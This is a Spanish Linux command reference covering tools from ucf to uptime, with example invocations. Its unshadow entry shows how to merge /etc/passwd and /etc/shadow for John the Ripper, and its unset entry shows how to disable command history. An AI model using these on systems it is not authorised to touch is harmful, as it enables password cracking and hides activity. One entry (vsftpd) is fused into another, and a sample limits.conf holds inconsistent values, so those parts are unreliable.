La política de Debian exige que los cambios de los usuarios en los archivos de configuración se preserven durante las actualizaciones de paquetes. La manera de lograr este comportamiento es que en este caso dpkg los maneje especialmente durante las actualizaciones, avisando al usuario según sea necesario. Contiene las aplicaciones: lcf, ucfq y ucfr
# ucf archivo_user.conf /etc/archivo.conf (gestionar el archivo de configuración en /etc/archivo.conf, preservando los cambios que el usuario ha realizado en archivo_user.conf)
# ucf --force archivo_user.conf /etc/archivo.conf (sobrescribir archivo_user.conf en /etc/archivo.conf)
# ucf --purge /etc/archivo.conf (quitar un archivo de la gestión de ucf)
# ucf --three-way archivo_user.conf /etc/archivo.conf (asegurarse de que los cambios locales se preserven)


uchardet
Detecta la codificación de un texto.
        $ uchardet texto.txt
        UTF-8


udev
Demonio que crea y elimina dinámicamente nodos de dispositivos de /dev/, maneja eventos de conexión en caliente y carga controladores en el momento del arranque. Contiene las aplicaciones systemd-hwdb y udevadm
$ systemctl status udev (comprobar si está activo)


udevil
Monta y desmonta dispositivos extraíbles y recursos compartidos de red sin requerir una contraseña, muestra información del dispositivo y monitorea los cambios del dispositivo. Incluye el script de montaje automático devmon.
$ udevil mount /dev/sda1
$ udevil unmount /dev/sda1
$ udevil info /dev/sda


udiskie
Herramienta  para montar automaticamente unidades en Archlinux. Debe arrancarse el servicio antes de ejecutarse el gestor de ventanas en el archivo .xinitrc. Un ejemplo:
# nano .xinitrc
udiskie & exec openbox-session


udisks
Comando para montar y desmontar volumenes usando el demonio que llaman programas como Nautilus o Thunar. Con este método conseguimos que desde estos programas se pueda desmontar cómodamente la partición y además sin necesidad de permisos.
$ udisks --mount /dev/sda1 (montará esta partición).
$ udisks --unmount /dev/sda1 (desmontará esta partición).
$ udisks --monitor (Monitoriza la actividad del demonio. Muy útil para verificar si una partición es montada o no)


udisks2
Actualización del anterior comando. Demonio que permite operaciones como consultar, montar, desmontar, formatear o desconectar dispositivos de almacenamiento como discos duros o memorias USB.
$ udisksctl status (comprobar todos los discos duros y usbs conectados)
$ udisksctl status nvme0n1 (comprobar si determinado disco está conectado)
$ udisksctl mount -b /dev/sdd1 (montar dispositivo. Equivalente al clásico mount /dev/sdd1)
$ udisksctl unmount -b /dev/sdd1 (desmontar dispositivo. Equivalente al clásico umount /dev/sdd1)
$ udisksctl dump (mostrar toda la información de todos los dispositivos con detalle)
$ udisksctl info -b /dev/sda (mostrar información sobre un dispositivo)


ufw
Cortafuegos
# ufw enable (activar el cortafuegos. “disable” para desactivarlo)
# ufw deny 4662 (bloquea el puerto)
# ufw deny from 123.1.103.8 (denegar toda conexion de la ip especificada)
# ufw allow 22 (abre el puerto 22)
# ufw allow from 123.1.103.8 to any port 22 (Que la ip especificada pueda acceder al nuestro puerto 22)
# ufw delete allow 22 (anula la regla de abrir el puerto 22)
# ufw allow 40000:44000/tcp (abrir un rango de puertos)
# ufw delete deny 4662 (Elimina una regla)
# ufw allow smtp (permitir servicios concretos)
# ufw status (visualizar las normas definidas)
# ufw status numbered (que muestre las normas numeradas)
# ufw delete numero (eliminar una regla con el número que muestra "status numbered")
# ufw status verbose (Información de estado con mayor detalle)
# ufw default allow (permitir todo por defecto)
# ufw default deny (bloquear todo por defecto)
# ufw deny from ip (bloquear dirección ip)
# ufw logging on (activar los logs. “off” para desactivarlos. Herramienta de registro: fwanalog, fwlogwatch, o lire.)
# ufw app list (lista de las aplicaciones con reglas)
# ufw app info WWW (información sobre una regla del listado anterior)
# ufw reset (resetear completamente el cortafuegos)


uidmap
Estos programas ayudan a los usuarios sin privilegios a crear espacios de usuario [uid] y de grupo [gid] en contenedores o en configuraciones que requieren el aislamiento de permisos . Incluye los comandos getsubuids, newgidmap y newuidmap
$ getsubuids user (lista de UID subordinados asignados al usuario del tipo "username:100000:65536" [que tiene asignado el rango de UID desde 100000 y puede usar hasta 65536 UIDs])
$ getsubgids user (lo mismo para el grupo)
$ newuidmap 1234 0 100000 65536 (que dentro del proceso con PID 1234, el UID 0 [root] será mapeado al UID 100000 en el sistema host y se le asignarán un total de 65536 UIDs, es decir, desde 100000 hasta 165535
$ newuidmap 1234 0 100000 1000 1000 200000 1000 (que dentro del PID 1234, el UID 0 en el namespace se mapeará a 100000 en el host y se mapearán 1000 UIDs a partir de ese y el UID 1000 en el namespace se mapeará a 200000 en el host y se mapearán 1000 UIDs a partir de ese)
$ newgidmap 1234 0 100000 65536 (el GID 0 dentro del namespace del proceso con PID 1234 será mapeado a 100000 en el host, con un rango de 65536 GIDs)
$ newgidmap 1234 0 100000 1000 1000 200000 1000 (que dentro del proceso 1234 el GID 0 en el namespace se mapeará a 100000 en el host, con 1000 GIDs yque el GID 1000 en el namespace se mapeará a 200000 en el host con 1000 GIDs)


ul
Subrayado de palabras en la terminal.
	$ echo $'linux es g\b_e\b_n\b_i\b_a\b_l\b_ ' | ul (Cada letra a subrayar ha de ir seguida de \b_)


ulimit
Permite  visualizar o limitar los recursos del sistema.
# ulimit -f 512000 (limita a los usuarios para que no puedan crear archivos de mayor tamaño que 512000 Kb [500 #Mb])
$ ulimit -a   (ver todos los parámetros)
$ ulimit -n (cantidad máxima de ficheros que se pueden abrir)
$ ulimit -SHn (ver la cantidad máxima de ficheros que se pueden abrir, blandos [por el usuario] y duros [por root])
$ ulimit -Sn 10000 (modificarlo a 10000 mientras no se cierre la sesión)
Parámetros:
	core (Tamaño máximo de los ficheros core [KB])
	data (Tamaño máximo para el segmento de datos [KB])
	fsize (Tamaño máximo para los ficheros [KB])
	memlock (Tamaño máximo para el espacio de direcciones bloqueado en memoria [KB])
	nofile (Número máximo de ficheros abiertos)
	rss (Tamaño máximo del conjunto residente en memoria [KB])
	stack (Tamaño máximo para la pila [KB])
	cpu (Tiempo máximo de CPU [minutos])
	nproc (Número máximo de procesos)
	as (Límite en el espacio de direcciones)
	maxlogins (Número máximo de logins)
	priority (Prioridad de base para los procesos del usuario)
	locks (Número máximo de ficheros bloqueados que el usuario puede mantener)
Nota.- El ámbito de aplicación del límite puede ser un nombre de usuario, un grupo (@grupo) o todos (*)
Un ejemplo de limit.conf:
	*               soft    nproc           10000
	*               hard    nproc           4096
	*               soft    core            unlimited
	*               hard    core            unlimited
	*               soft    memlock         131072
	*               hard    memlock         131072
	*               soft    nofile          102400
	*               hard    nofile          102400
1.-
Evitar Forkboms [programas que consumen la totalidad de los recursos del sistema]
Si al lanzar el comando:
$ ulimit -u
El resultado es “ilimitado” o un valor extremadamente alto, podemos ser victimas de los forkbombs. Para resolverlo podemos limitar el número de procesos abiertos a 1000 para que estos no puedan llegar a colapsar el sistema:
# gedit /etc/security/limits.conf
Añadir antes de “End of file”:   * hard nproc 1000
Reiniciar
2.-
En ciertas ocasiones, al procesar muchos archivos, se produce un error "for output (Too many open files)" porque se desborda el limite de 1024 k. Para solucionarlo:
# nano /etc/security/limits.conf
Y añadir las siguientes lineas:
	*    soft    nofile    9000
	*    hard    nofile    65000
Los asteriscos pueden sustituirse por el nombre de usuario.
3.-
Limitar la cantidad de usuarios conectados al sistema:
# nano /etc/security/limits.conf
Y en el parámetro maxlogins modificamos el número que deseemos:
	*    -       maxlogins 3


umask
Fija los permisos de un fichero o directorio. Los permisos base para los directorios son 0777 (rwxrwxrwx) y para los archivos 0666 (rw-rw-rw-). Por tanto la cifra que proporciona umask ha de restarse de estos importes para conocer los permisos reales:
$ umask (muestra permisos actuale en octals. Normalmente 0022 por tanto los permisos reales son 755 para directorios y 644 para ficheros)
$ umask -S (muestra los permisos en notación simbolica)
Ejemplo:
	$ touch archivo.txt
	$ mkdir dir
	$ ls -l
	total 4
	-rw-r--r-- 1 templix templix    0 abr 12 06:10 archivo.txt
	drwxr-xr-x 2 templix templix 4096 abr 12 06:10 dir
# umask 0002 (Modifica los permisos a 0775 para directorios y 664 para archivos)


umount
Desmontar particiones
$ umount -a (Desmonta todas las especificadas en /etc/mtab)
$ umount -r (Si falla el desmontaje, intenta remontar como “solo lectura”)
$ umount -t vfat,ext3 (Solo desmonta los tipos especificados)
$ umount -fl (fuerza el desmonte de la particion)


unaccent
Lee datos que se entran por stdin y cuando se pulsa intro los repite a continuación sin acentos.
$ unaccent --debug_low UTF-8


unalias
Suprimir alias.
$ unalias -a (Suprime todos los alias)


uname
Informa de la ...
$ uname -a (... versión instalada del kernel y otros datos)
$ uname -m (... arquitectura de la máquina)
$ uname -r (... versión instalada del kernel)


unar
Extraer archivos de un paquete.
        $ unar bashrc.tar
        bashrc.tar: Gzip
          bashrc... OK.
          Successfully extracted to "./bashrc".


unattended-upgrades
Descargar e instalar actualizaciones de seguridad de forma automática y desatendida. Aunque esté activado, notificará acerca de las actualizaciones "normales", pero solo se instalaran automáticamente las actualizaciones de seguridad. Para activar lanzar:
# dpkg-reconfigure -plow  unattended-upgrades
Y contestar "yes". El parámetro "-plou" indica que solo se hagan preguntas esenciales durante la configuración. Se crea el archivo de configuración en /etc/apt/apt.conf.d/20auto-upgrades con el siguiente contenido (los comentarios han sido añadidos):
  # Asegura que las listas de paquetes se actualicen regularmente:
  APT::Periodic::Update-Package-Lists "1";
  # Que se instalen automáticamente las actualizaciones disponibles y los parches de seguridad críticos:
  APT::Periodic::Unattended-Upgrade "1";


unbound
Servidor DNS de almacenamiento en caché solo recursivo que puede realizar la validación de resultados DNSSEC [Extensiones de seguridad DNS]. Implementa solo una cantidad mínima de servicio autorizado para evitar fugas a los servidores de nombres raíz: búsquedas directas para localhost, inversas para 127.0.0.1 y ::1, y NXDOMAIN [que no se pueda resolver el nombre del dominio] para zonas atendidas por AS112 [grupo de operadores de servidores de nombres de voluntarios que se unieron en un sistema autónomo].
$ unbound-checkconf (averiguar si existen errores en el archivo de configuración /etc/unbound/unbound.conf)
$ unbound (activa el daemon)


undbx
Herramienta para exportar los correos de Outlook en formato DBX al formato EML para posteriormente importar en Thunderbird
$ undbx carpeta-origen carpeta-exportacion (Primero se define la carpeta origen donde se encuentran los ficheros DBX y a continuación se especifica el directorio de salida)


undertime
Muestra una tabla simple de 24 horas con horarios coincidentes en diferentes zonas horarias o ciudades.
$ undertime -l (listado de las zonas posibles)
$ undertime -t Europe/Madrid (horas en una zona)
$ undertime --timezones Europe/Madrid Europe/Moscow (en dos zonas especificadas)
$ undertime --no-default-zone (muestra varias zonas)


unexpand
Convertir espacios en tabulaciones.
$ unexpand -t 4 -a texto.txt (Sólo las lineas que tengan 4 espacios en blanco, sea al inicio o entre palabras)
$ unexpand -t 2  --first-only texto.txt (Sólo las que empiecen por 2 espacios en blanco)


unhide
Herramienta forense para encontrar procesos y puertos TCP/UDP ocultos por rootkits, módulos del kernel o por otras técnicas. Incluye utilidades: unhide, unhide-tcp, unhide-linux y unhide-posix.
# unhide-tcp (identifica los puertos TCP/UDP que están escuchando, pero no figuran en /bin/netstat a través de fuerza bruta)
# unhide proc (compara /proc con la salida de /bin/ps)
# unhide -m -d sys proc brute (más comprobaciones con las pruebas: sys, proc y brute)
# unhide-linux procall (combina pruebas proc y procfs)
# unhide-linux procfs (comparar la información recopilada de /bin/ps con la información recopilada en los procfs)
# unhide quick (combina las técnicas proc, procfs y sys. Es aproximadamente 20 veces más rápido, pero puede dar más falsos positivos.)
# unhide-posix proc
# unhide-linux reverse
Opciones
sys (compara la info de /bin/ps con la obtenida de las llamadas al sistema.)
brute (Identifica por fuerza bruta todos los procesos)
reverse (consiste en verificar que todos los subprocesos vistos por ps también se ven en procfs y por llamadas al sistema. Su objetivo es verificar que un rootkit no haya matado una herramienta de seguridad [ID u otra] y hacer que ps muestre un proceso falso en su lugar)


unhtml
Elimina todo el formato HTML que encuentra e un fichero e imprime el texto limpio.
$ unhtml index.html > /home/usuario/index.txt (Si no se facilita el archivo de destino, lo muestra en pantalla)


unicode
Es un estándar de codificación de 4 caracteres que engloba todos los caracteres de uso común y en la actualidad, cuenta con alrededor de 150.000 caracteres provenientes de diversos alfabetos [chino, cuneiforme ,rúnico...], sistemas ideográficos y colecciones de símbolos [matemáticas, tecnología, música, iconografía...]. Además de los caracteres alfabéticos, Unicode también incluye una variedad de caracteres, como  fichas de juegos como el dominó, flechas, iconos, etc. Una tabla completa en https://symbl.cc/es/unicode/table/
$ unicode --list (listado de codificaciones)
$ unicode --ascii (tabla ascii)
$ unicode --brexit
$ unicode -d 9 (propiedades del caracter numerico "9")
$ unicode -a ñ (de forma automática determinar las caracteristicas del caracter colocado [ñ])
$ unicode -w t (busqueda en la wikipedia [abre la página en el navegador] el caracter mencionado [t])
$ 月(ctrl-shift-u 6708 intro)
$ Ǣ (ctrl-shift-u 01e2 intro


unicode_start
Pondrá el teclado y la consola en modo Unicode [UTF-8].
$ unicode_start [font] [umap]
Nota.- El parámetro "font" es una fuente que está cargada. Debe tener un mapa Unicode incorporado o, si no lo tiene, dicho mapa se puede proporcionar explícitamente como segundo parámetro. Cuando no se especificó ninguna fuente, se mantiene la fuente actual. Unicode es la codificación de caracteres estándar para la mayoría de las computadoras del mundo. Garantiza que el texto, incluidas letras, símbolos, emojis e incluso caracteres de control, aparezca igual en diferentes dispositivos, plataformas y documentos digitales, independientemente del sistema operativo o el software que se utilice.


unicode_stop
Deshará el efecto de unicode_start. Pone el teclado en modo ASCII y borra el modo UTF-8 de la consola.
$ unicode_stop


unimatrix
Lluvia de código y simbolos que aparecen en el película matrix escrito en python. Descarga: <https://github.com/will8211/unimatrix#install>
$ unimatrix (por defecto)
$ unimatrix -n -s 96 -u linux (no usar caracteres en negrita [n], 96 de velocidad [por derecto 85] y usando solo las letras indicadas)
Otras opciones:
	-g COLOR (color de fondo. Por defecto el de la terminal)
	-f (habilitar caracteres cambiantes)
	-b (usar sólo caracteres en negrita)
	-t 60 (Terminar el proceso a los 60 segundos)


uniq
Ignora las líneas idénticas siempre y cuando sean adyacentes.
$ uniq -u archivo archivo_sin repeticiones
$ uniq -d archivo archivo2 (en archivo2 sólo las repetidas)
$ uniq -c archivo (Muestra al principio de la linea el número de veces que se repite)


unison
[openssh-server ssh]. Sincronización de carpetas remotas.
Previamente crear la clave y copiarla al otro pc:
$ ssh-keygen -t dsa
$ ssh-copy-id -i $HOME/.ssh/id_dsa.pub root@ip_o_host
Sincronizar las carpetas (la web en este ejemplo)
$ unison /srv/http ssh://ip_o_host//srv/http
Si la carpeta a sincronizar se coloca en el archivo de configuración:
# nano /root/.unison/default.prf
root = /srv/http
root = ssh://ip_o_host//srv/http
Puede colocarse la orden en el cron para que se actualice cada 5 minutos:
crontab -e
	*/5 * * * * /usr/bin/unison &> /dev/null


units
Conversor de unidades [metros, litros, millas, pulgadas, grados...]. Las unidades han de expresarse en inglés.
$ units
Muestra "You have" para entrar lo que tenemos [1m, 10lb, 2hr, tempK(0)... ] y a continuación "You want", lo que queremos. Algunos ejemplos:
De millas a kilómetros:
	You have: 10mi
	You want: km
		* 16.09344
		/ 0.062137119
De libras a gramos:
	You have: 1lb
	You want: gr
		* 7000
		/ 0.00014285714
De grados kelvin a celsius:
	You have: tempK(0)
	You want: tempC
		-273.15
De 3 horas más 16 minutos a segundos
	You have: 3hr + 16min
	You want: sec
		* 11760
		/ 8.5034014e-05


unity
Escritorio.
$ unity --reset (Resetear la configuración de unity)
$ unity --reset-icons (eliminar iconos agregados al launcher)
$ unity --replace (reiniciar)


uniutils
Conjunto de herramientas útiles cuando se trabaja con archivos Unicode si se desconoce el sistema de escritura, no se tiene la fuente necesaria, se necesita inspeccionar caracteres invisibles, se necesita averiguar si se han combinado caracteres o en qué orden aparecen, o se necesitan estadísticas sobre qué caracteres aparecen. Consta de los siguientes ejecutables: ExplicateUTF8 [depurar o aprender sobre Unicode. Determina y explica la validez de una secuencia de bytes como una codificación UTF8], unidesc [rangos de caracteres a los que pertenecen las diferentes partes del texto. También se puede utilizar para identificar codificaciones Unicode], unifuzz [Emite cadenas diseñadas para probar el manejo de Unicode], unihist [genera un histograma de los caracteres en su entrada], uniname [imprime de forma predeterminada el desplazamiento de cada carácter, su desplazamiento de bytes, su valor de código hexadecimal, su codificación, el glifo en sí y su nombre. También se puede utilizar para validar la entrada UTF-8], unireverse [invierte cada línea de entrada carácter por carácter] y utf8lookup [buscar caracteres Unicode]
$ ExplicateUTF8 texto.txt
$ unidesc -l (rangos unicode en orden alfabético)
$ uniname -r texto.txt (imprimir el rango unicode)
$ echo -e "\x54\xCE\x95\x53\xD0\xA2\x45\x52\x2E\x74\x78\x74" | uniname
$ unireverse (se entra frase y al pulsar intro la escribe a la inversa)


unix2dos
Convertir formatos unix a msdos
$ unix2dos fichero_unix fichero_dosServidor de archivos ftp. Toda la configuración de encuentra en el archivo:
# nano /etc/vsftpd.conf
Algunos de los parámetros:
anonymous_enable=NO # si no queremos accesos anonimos
local_enable=YES # Permitir accesos locales autentificados
write_enable=YES # Permite escritura en el servidor
ftpd_banner=Entrando en el servidor ftp...
chroot_local_user=YES # Enjaular la conexión a su propio directorio personal
max_clients=5 # limitar a 5 los accesos simultaneos
Nota.- Han de redigirirse los puertos 20 y 21 y el rango especificado en el archivo de configuración:
pasv_min_port=44000
pasv_max_port=44100
El cliente podrá conectarse al servidor via filezilla, gftp...


unlink
Elimina un archivo especificado.
$ unlink archivo


unoconv
Exporta todos los formatos soportados por openoffice/libreoffice a otros formatos como pdf, txt... creando un archivo con el mismo nombre de origen pero con la nueva extensión. Para una lista detallada consultar este enlace: <http://dag.wieers.com/home-made/unoconv/>
$ unoconv --show  (Visualizar formatos  soportados)
$ unoconv -f xls archivo.csv (convertir un csv a xls)
$ unoconv -f pdf *.odp *.odt (Convierte todos los .odt y .odp a pdfs)
$ unoconv --format=txt document1.odt (convierte el documento a texto plano)
$ unoconv --format=txt --stdout document1.odt > salida.txt (envia la salida al STDOUT para redireccionarla a un fichero cualquiera)


unopkg
Instalador de extensiones libreoffice por consola.
$ unopkg add -v extension.oxt (Instala para un usuario mnostrando toda la salida)
$ unopkg add -f extension.oxt (Instala para todos los usuarios)
$ unopkg add -s -f extension.oxt (Si la extension precisa aceptar licencia)
$ unopkg list (Lista las instaladas)
$ unopkg reinstall
$ unopkg remove extension.oxt ()
$ unopkg gui (abre en modo gráfico)


unp
Extractor universal de archivos comprimidos.
$ unp -s (Listado de formatos soportados)
$ unp archivo.tar (descomprimir un archivo)


unpaper
Herramienta de posprocesamiento para hojas escaneadas, especialmente para páginas de libros que han sido escaneadas a partir de fotocopias creadas previamente. El objetivo principal es hacer que las páginas de libros escaneadas sean mejor legibles en la pantalla después de la conversión a PDF, limpiando manchas y enderezando páginas torcidas. De forma predeterminada, unpaper coloca un archivo de imagen de entrada en una hoja y guarda un archivo de imagen de salida en otra.
$ unpaper pagina1.pnm pagina1_procesada.pnm (proceso básico)
$ unpaper --deskew pagina1.pnm pagina1_enderezada.pnm (Enderezar una página)
$ unpaper --border 50 pagina1.pnm pagina1_sin_bordes.pnm (Eliminar manchas oscuras o bordes negros de las imágenes recortando 50 píxeles los bordes de la imagen)
$ unpaper --output-format=p%d.pnm pagina%d.pnm pagina_procesada%d.pnm (procesará pagina1.pnm, pagina2.pnm, etc y las guardará como pagina_procesada1.pnm, pagina_procesada2.pnm, y así sucesivamente)
$ unpaper --noisefilter=5 pagina1.pnm pagina1_menos_ruido.pnm (aplicar un filtro de ruido con una intensidad de 5)
$ unpaper --brightness=0.8 --contrast=1.2 pagina1.pnm pagina1_mejorada.pnm (reducir el brillo y aumentará el contraste de la imagen)
$ unpaper --precut --overwrite --layout double paginalibro%d.pnm paginalibro_procesada%d.pnm (cortar los márgenes en páginas dobles, permitiendo que las páginas en blanco se ignoren)


unrar
Descomprimir archivos rar.
$ unrar x archivo.rar


unshadow
Herramienta para combinar los archivos passwd y shadow para que el comando "John de Ripper" pueda usarlos.
# unshadow /etc/passwd /etc/shadow > combine.txt


unset
elimina variables locales o asigna NULL
$ unset HISTFILE; unset SAVEHIST  (desactiva el historial de comandos)
$ unset -f funcion (borrar una funcion)
$ unset VAR (Eliminar una variable)


unsort
Reordena las lineas de un archivo de forma semialeatoria.
$ unsort -p archivo.txt
$ unsort -M archivo1.txt archivo2.txt (Uniendo en la salida los dos archivos)
$ unsort -n archivo1.txt archivo2.txt (Mezcla las lineas de forma aleatoria sin alterar el orden)


until
Estructura muy parecida a while [until, do, done], pero con la forma de evaluar la condición al revés, es decir, se ejecuta mientras la condición sea falsa.
Algunos ejemplos:
1.-
Decrecer un contador hasta llegar a 5
	#!/bin/bash
	CONTADOR=10
	until [  $CONTADOR -lt 5 ]; do
	   echo "El contador a $CONTADOR"
	   let CONTADOR-=1
	done
2.-
	#!/bin/bash
	SALIR=si
	until [ "$OPCION" = "$SALIR" ]
	do
	  echo "Pulsar teclas... "
	  echo "(\"$SALIR\" para salir)"
	  read OPCION
	  echo "Pulsada la opción salir ($OPCION)"
	  echo
	done


unzip
Descomprimir archivos zip.
$ unzip archivo.zip
$ unzip -v archivo.zip (Ver contenido)
$ unzip -l archivo.odt (Ver contenido de un archivo odt)


update-alternatives
Modificar las aplicaciones por defecto cuando existen otras posibilidades
$ ls /etc/alternatives  (Muestra todas las posibilidades)
$ update-alternatives --list x-www-browser (muestra las alternativas al navegador por defecto)
$ update-alternatives --display x-www-browser (Para ver, de las opciones, la utilizada)
$ update-alternatives --config x-www-browser (Para modificarla)
$ update-alternatives --config x-cursor-theme (Modificar el tema del cursor)
$ update-alternatives --install  /usr/bin/x-www-browser x-www-browser /usr/bin/firefox 100 (Incluir en el listado una aplicación que no está)


update-binfmts
Las versiones 2.1.43 y posteriores del kernel de Linux han contenido el módulo binfmt_misc. Esto permite al administrador del sistema registrar intérpretes para varios formatos binarios en función de un número o su extensión de archivo y hacer que se invoque al intérprete apropiado cada vez que se ejecute un archivo coincidente. Piense en ello como una versión más flexible del #! ejecutable, o como algo que puede comportarse un poco como "asociaciones" en otros sistemas operativos aunque en GNU/Linux la tendencia es mantener este tipo de cosas en otro lugar, como en su administrador de archivos. update-binfmts gestiona una base de datos persistente de estos intérpretes.
# update-binfmts --package openjdk-6 --remove jar /usr/bin/jexec (eliminar el enlace de formatos binarios con openjdk-6)
# update-binfmts --display (información sobre todos los formatos binarios y si están habilitados o deshabilitados)
# update-binfmts --disable python3.11 (deshabilitar un formato)


update-ca-certificates
Programa que actualiza el directorio /etc/ssl/certs para contener certificados SSL y genera certificados ca-certificates.crt.
# update-ca-certificates
# update-ca-certificates -f (actualizar)


update-catalog
Inserta, actualiza o elimina entradas en los catálogos centralizados de SGML [Standard Generalized Markup Language]. ISO 8879: 1986 es un estándar para definir lenguajes de marcado generalizados para documentos ubicado en /etc/sgml. Para cambiar el supercatálogo SGML ubicado en /etc/sgml/catalog modifique el contenido del directorio de /etc/sgml para que contenga nuevos archivos o enlaces simbólicos que tengan una extensión cat o elimine (o mueva) los catálogos existentes y regenere el catálogo.
# update-catalog --update-super (regenerar el catálogo)


update-cracklib
Crear una versión comprimida y acumulada de las listas de palabras almacenadas en los directorios proporcionados en el archivo de configuración de cracklib /etc/cracklib/cracklib.conf.
$ update-cracklib


update-desktop-database
Herramienta para construir una base de datos de la caché de los tipos MIME manejados por archivos. La base de datos de caché contiene la lista de tipos MIME que pueden manejar los archivos , así como, para cada tipo MIME, una lista de archivos que pueden manejar este tipo MIME. Esta base de datos de caché facilita el trabajo de las aplicaciones que necesitan encontrar una aplicación que puede abrir un documento de un tipo MIME específico y así esas aplicaciones no tendrán que analizar todos los archivos existentes en el sistema y en su lugar pueden analizar esta base de datos de caché.
# update-desktop-database -v


update-dlocatedb
Genera una lista del contenido del paquete en texto plano a partir de los archivos /var/lib/dpkg/info/*.list
# update-dlocatedb -p (actualizar solo la lista de archivos)


update-dictcommon-aspell
Esta secuencia reconstruirá la base de datos de aspell, así como las cosas de squirrelmail, jed y emacsen. Según la página man existe esta nota: ADVERTENCIA: No debe usarse desde la línea de comando a menos que sepa muy bien lo que está haciendo.
$ update-dictcommon-aspell


update-fonts-dir
Crear un archivo fonts.dir en el directorio de fuentes X Windows System [/usr/share/fonts/X11]. Normalmente se invoca solo desde los scripts posteriores a la instalación y posteriores a la eliminación de un paquete que contiene fuentes para X Window System, pero puede invocarse en cualquier momento para reconstruir el archivos fonts.dir [/usr/share/fonts/X11/100dpi/fonts.dir]. Solo es preciso el último componente de la ruta ["75dpi" "100dp" o "misc"], update-fonts-dir generará /usr/share/fonts/X11/100dpi/fonts.dir o /usr/share/fonts/X11/75dpi/fonts.dir desde los archivos de fuentes que se encuentran dentro de él. Esto permite que múltiples paquetes proporcionen nombres para las fuentes en el mismo directorio. Ningún paquete de fuente realmente proporciona el archivo fonts.dir en el directorio de las fuentes X Windows System, por lo que no hay peligro de sobrescribir los nombres de fuente de un paquete con los de otro.
# update-fonts-dir 75dpi
# update-fonts-dir 100dpi


update-fonts-scale
Ensambla un archivo fonts.scale en un directorio de fuentes X utilizando uno o más archivos de escala que se encuentran en un subdirectorio de /etc/X11/fonts/.
# update-fonts-scale 75dpi
# update-fonts-scale Type1


update-geoip-database
descarga la última versión de la base de datos MaxMind GeoIP Lite del sitio web MaxMind [/usr/share/GeoIP].
$ update-geoip-database


update-grub
Actualiza el menú de arranque grub2
# update-grub2


update-icon-caches
script para actualizar las cachés de iconos en una lista de directorios. En cada uno de los directorios pasados como argumentos, la caché de iconos se actualiza si ya está presente. No se crea si no existe ya.
$ gtk-update-icon-cache /usr/share/icons/gnome/


update-ieee-data
Obtiene la versión actual de las listas OUI e IAB de IEEE Standards Association [IEEE-SA lleva desarrollando estándares durante más de un siglo a nivel mundial] y las instala si las versiones instaladas tienen más de 5 días. Esta utilidad requiere la instalación de curl, wget o libwww-perl.
# update-ieee-data (forma básica)
# update-ieee-data -f (Forzar la actualización, incluso si el archivo tiene más de 5 días)


update-info-dir
Actualiza o crea el directorio del archivo de índice de la documentación disponible en /usr/share/info/ [el predeterminado] o en el DIRECTORIO dado. La información del archivo de índice es el directorio que generalmente presentan los navegadores de información al inicio.
# update-info-dir /usr/share/info/


update-initramfs
Initramfs es un archivo cpio comprimido. En el momento del arranque, el kernel desempaqueta ese archivo en el disco RAM, lo monta y lo usa como raíz inicial del sistema de archivos.
# update-initramfs -u (actualizar un initramfs existente)
# update-initramfs -c (crea un initramfs nuevo)
# update-initramfs -d (elimina uno)
# update-initramfs -c -k 4.9.0-4-amd64 (crea uno nuevo con los datos especificados [k])


update-locale
[base-pass]. Actualizar el archivo por defecto del idioma /etc/default/locale que puede hacerse manualmente o con:
$ update-locale LANG=ca_ES.UTF-8


update-manager
Actualizar, en Ubuntu, a una nueva versión. Ver también do-release-upgrade.
# update-manager -d   (antes de salir la version estable final)
# update-manager -c   (despues de salir la version estable final)


update-menus
Regenerar los menus de gnome.


update-mime
Actualiza el archivo /etc/mailcap para reflejar la información mime modificada por un paquete Debian durante la instalación o desinstalación.
# update-mime


update-mime-database
Al arrancar o en la instalación de paquetes puede salir mensajes del tipo:
	Unknown media type in type 'all/all'
	Unknown media type in type 'all/allfiles'
	Unknown media type in type 'uri/mms'
	Unknown media type in type 'uri/mmst'
	Unknown media type in type 'uri/mmsu'
	Unknown media type in type 'uri/pnm'
	Unknown media type in type 'uri/rtspt'
	Unknown media type in type 'uri/rtspu'
Para solucionar estos errores que no afectan al funcionamiento del sistema:
# rm /usr/share/mime/packages/kde.xml
# update-mime-database /usr/share/mime


update-passwd
Actualiza /etc/passwd, /etc/shadow y /etc/group de forma segura.
# update-passwd -s (Realiza comprobaciones pero no hace nada)
Algunas opciones:
        -P fichero (Si no es el predeterminado /etc/passwd)
        -S fichero (Si no es el predeterminado /etc/shadow)
        -G fichero (Si no es el predeterminado /etc/group)


update-pciids
Si al ejecutar lspci nos muestra un mensaje "unknown device" es preciso actualizar la lista del archivo pci.ids [/usr/share/misc]. Descarga la lista de la última versión del archivo pci.ids del sitio de la distribución principal y lo instala. Esta utilidad requiere curl, wget o lynx para ser instalado.
# update-pciids


update-perl-sax-parsers
Inserta, actualiza y elimina archivos de información de módulos del analizador Perl SAX en el directorio /var/lib/libxml-sax-perl/ParserDetails.d y el archivo de información general de módulos perl /etc/perl/XML/SAX/ParserDetails.ini.
$ update-perl-sax-parsers --update (actualiza el archivo de información general de los módulos)
$ update-perl-sax-parsers --add modulo (Agrega el archivo de información para el módulo indicado)
$ update-perl-sax-parsers --remove modulo (Elimina el archivo de información del módulo indicado)


update-rc.d
Activar/desactivar aplicaciones o scripts en el arranque del sistema.
$ update-rc.d -f gdm remove (desactivarlo)
$ update-rc.d gdm defaults  (activarlo)
$ update-rc.d script defaults (coloca un script en el arranque)


update-shells
Localiza los shells provistos por los paquetes de /usr/share/debianutils/shells.d y actualiza /etc/shells con shells recién agregados o eliminados. Para realizar un seguimiento de los cambios realizados por el administrador, consulta un archivo de estado en /var/lib/shells.state.
$ update-shell --verbose (mostrar las shells que se van a añadir o quitar)


update-system
Mantener un sistema Debian actualizado pero sin elementos acumulados como las bibliotecas obsoletas y purgar todos los paquetes que no están listados como dependencias de otro paquete.
# update-system


update-usbids
[usbutils]. Si al ejecutar lsusb nos muestra un mensaje "unknown device" es preciso actualizar la lista del archivo /usr/share/misc/usb.ids. Descarga la última versión del archivo del sitio web y la instala. Esta utilidad requiere wget o lynx.
# update-usbids


upower
[acpitool] Ver las propiedades de la bateria. Para ver las baterias disponibles en el sistema:
	$ upower --enumerate
	/org/freedesktop/UPower/devices/line_power_AC
        /org/freedesktop/UPower/devices/battery_BAT0
	/org/freedesktop/UPower/devices/DisplayDevice
Nota.- /org no es un directorio físico, se tiene que llamar desde upower.
$ upower -i /org/freedesktop/UPower/devices/battery_BAT0 (la capacidad)
$ upower -v (Chequeo de la bateria)


uptime
Tiempo transcurrido desde que se arrancó el sistema
$ uptime -s (Muestra dia, hora, minuto y segondo que arranco el sistema)
$ uptime -p (Muestra el tiempo transcurrido desde que arrancó el sistema)


uptimed
